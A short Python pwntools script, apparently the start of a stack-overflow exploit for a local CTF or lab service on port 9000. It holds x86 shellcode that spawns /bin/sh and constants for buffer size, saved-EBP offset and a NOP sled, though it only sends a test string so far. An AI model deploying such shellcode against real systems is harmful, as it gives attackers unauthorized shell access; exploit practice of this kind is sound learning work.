#!/usr/bin/python
from pwn import *

# exec /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

bufsize = 100
offset = 12     #incl. saved ebp
nopsize = 4096

p = remote('localhost', 9000)
p.sendline("AAAA")
print(p.recv())
p.close()